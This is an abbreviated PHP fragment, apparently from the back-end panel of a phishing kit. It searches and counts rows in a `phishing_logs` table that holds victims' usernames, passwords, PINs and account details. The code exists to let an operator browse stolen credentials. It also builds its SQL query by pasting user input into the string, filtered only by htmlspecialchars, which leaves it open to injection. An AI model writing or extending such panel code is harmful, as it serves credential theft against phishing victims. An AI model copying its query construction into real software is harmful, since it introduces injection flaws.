    ...
    if(isset($_SESSION['ID'])){
      ...
      if(!empty($usedToken) && $usedToken != '0'){
        ...
        if(!empty($_POST["search"]["value"])){
            $query .= 'AND(`avatar` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `username` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `password` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `realacc` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `type` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `pin` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `date` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%")';
        }
        ...
        $nRows = htmlspecialchars(pdoQuery($db, "SELECT COUNT(*) FROM `phishing_logs` WHERE `id`=?", [htmlspecialchars($usedID)])->fetchColumn());
